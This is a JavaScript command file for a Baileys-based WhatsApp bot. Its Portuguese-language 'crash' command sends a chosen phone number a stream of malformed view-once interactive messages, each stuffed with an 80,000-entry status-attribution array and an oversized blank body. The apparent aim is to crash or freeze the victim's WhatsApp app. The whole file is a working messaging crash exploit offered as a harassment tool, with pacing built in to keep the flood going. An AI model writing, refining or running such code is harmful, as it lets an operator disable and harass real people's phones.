import { generateWAMessageFromContent, proto } from "baileys"

export default {
    name: "crash",
    aliases: ["travar"],
    description: "Envia uma chuva de travas pro alvo",
    category: "creator",

    async run({ sock, msg, args }) {
        const from = msg.key.remoteJid
        const targetNum = args[0]?.replace(/[^0-9]/g, '')
        const qtd = parseInt(args[1]) || 1

        if (!targetNum) {
            return sock.sendMessage(
                from, 
                { text: "Manda o número do alvo e a quantidade, João! 🫡" }, 
                { quoted: msg }
            )
        }

        const target = targetNum + "@s.whatsapp.net"
        await sock.sendMessage(from, { react: { text: "⏳", key: msg.key } })

        try {
            // Configurações para controle de velocidade
            const delay = 100 // ms entre mensagens
            let successCount = 0
            
            for (let i = 0; i < qtd; i++) {
                try {
                    // Estrutura de mensagem mais robusta
                    const msgData = {
                        viewOnceMessageV2: {
                            message: {
                                interactiveResponseMessage: {
                                    body: { text: " ".repeat(500), format: "DEFAULT" },
                                    nativeFlowResponseMessage: {
                                        name: "call_permission_request",
                                        paramsJson: '{"test": "true"}',
                                        version: 3
                                    },
                                    contextInfo: {
                                        remoteJid: "status@broadcast",
                                        statusAttributionType: "RESHARED_FROM_POST",
                                        isQuestion: true,
                                        statusAttributions: Array(80000).fill({ type: "EXTERNAL_SHARE" })
                                    }
                                }
                            }
                        }
                    }

                    const preparedMsg = generateWAMessageFromContent(
                        target, 
                        proto.Message.fromObject(msgData), 
                        { userJid: target }
                    )
                    
                    await sock.relayMessage(
                        target, 
                        preparedMsg.message, 
                        { messageId: preparedMsg.key.id }
                    )
                    
                    successCount++
                    // Controle de velocidade
                    if ((i+1) % 10 === 0) {
                        await new Promise(r => setTimeout(r, delay * 10))
                    } else {
                        await new Promise(r => setTimeout(r, delay))
                    }
                } catch (innerError) {
                    console.log(`Erro na mensagem ${i+1}:`, innerError)
                }
            }

            await sock.sendMessage(
                from, 
                { text: `✅ ${successCount}/${qtd} pacotes enviados.` }, 
                { quoted: msg }
            )
        } catch (e) {
            console.log("Erro no ataque do João Tank:", e)
            await sock.sendMessage(
                from, 
                { text: "Deu erro no envio, mestre. Vê o console!" }
            )
        }
    }
}